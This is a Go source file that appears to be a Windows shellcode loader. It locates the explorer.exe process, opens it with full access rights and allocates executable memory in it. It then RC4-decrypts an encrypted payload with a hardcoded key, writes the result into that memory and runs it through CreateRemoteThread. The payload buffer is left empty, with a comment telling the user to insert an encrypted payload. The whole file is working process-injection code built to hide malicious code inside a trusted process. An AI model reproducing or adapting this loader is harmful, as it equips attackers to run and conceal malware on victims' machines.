package main

import (
	"flag"
	"log"
	"syscall"
	"unsafe"
	"fmt"
	"crypto/rc4"
)

const (
    TH32CS_SNAPPROCESS = 0x00000002
    INVALID_HANDLE_VALUE = ^uintptr(0)
    MAX_PATH = 260
)

type PROCESSENTRY32 struct {
    dwSize              uint32
    cntUsage            uint32
    th32ProcessID       uint32
    th32DefaultHeapID   uintptr
    th32ModuleID        uint32
    cntThreads          uint32
    th32ParentProcessID uint32
    pcPriClassBase      int32
    dwFlags             uint32
    szExeFile           [MAX_PATH]uint16
}

var (
    kernel32 = syscall.MustLoadDLL("kernel32.dll")
    procCreateToolhelp32Snapshot = kernel32.MustFindProc("CreateToolhelp32Snapshot")
    procProcess32First = kernel32.MustFindProc("Process32FirstW")
    procProcess32Next = kernel32.MustFindProc("Process32NextW")
    procCloseHandle = kernel32.MustFindProc("CloseHandle")
    procLstrcmpi = kernel32.MustFindProc("lstrcmpiW")
    openProcess = kernel32.MustFindProc("OpenProcess")
    virtualAllocEx = kernel32.MustFindProc("VirtualAllocEx")
    writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
    createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
)


func main() {
	log.SetFlags(0)
    pid := FindTarget("explorer.exe")

    if pid != 0 {
        fmt.Printf("Process Explorer.exe found, PID: %d\n", pid)
    } else {
        fmt.Println("Processo Explorer.exe not found")
    }
	processId := pid
	flag.Parse()
	
	key := []byte("\x44\xe6\x89\xe7\xbf\xcd\x3e\xcb\x68\x85\x8e\xbc\xda\x61\xe7\xf7")
	
  //Insert the encrypted pyld
	sch := []byte("")

	processID := (int(processId))

	handle, _, _ := openProcess.Call(0x001F0FFF, 0, uintptr(processID))
	destAddress, _, _ := virtualAllocEx.Call(handle, 0, uintptr(len(sch)), 0x1000|0x2000, 0x40)

	decrypted, _ := Decryptsch(sch, key)

	writeProcessMemory.Call(handle, destAddress, uintptr(unsafe.Pointer(&decrypted[0])), uintptr(len(decrypted)), 0)
	createRemoteThread.Call(handle, 0, 0, destAddress, 0, 0)
	
	}

func Decryptsch(encrypted []byte, key []byte) ([]byte, error) {
	// Decrypt the encrypted sch using the key
	decrypted := make([]byte, len(encrypted))
	cipher, _ := rc4.NewCipher(key)
	cipher.XORKeyStream(decrypted, encrypted)

	return decrypted, nil
}

func FindTarget(procname string) uint32 {
    hProcSnap, _, _ := procCreateToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPPROCESS), 0)
    if hProcSnap == uintptr(INVALID_HANDLE_VALUE) {
        return 0
    }
    var pe32 PROCESSENTRY32
    pe32.dwSize = uint32(unsafe.Sizeof(pe32))
    ret, _, _ := procProcess32First.Call(hProcSnap, uintptr(unsafe.Pointer(&pe32)))
    if ret == 0 {
        procCloseHandle.Call(hProcSnap)
        return 0
    }
    var pid uint32 = 0
    for {
        ret, _, _ := procProcess32Next.Call(hProcSnap, uintptr(unsafe.Pointer(&pe32)))
        if ret == 0 {
            break
        }
        ret, _, _ = procLstrcmpi.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(procname))), uintptr(unsafe.Pointer(&pe32.szExeFile[0])))
        if ret == 0 {
            pid = pe32.th32ProcessID
            break
        }
    }
    procCloseHandle.Call(hProcSnap)
    return pid
}


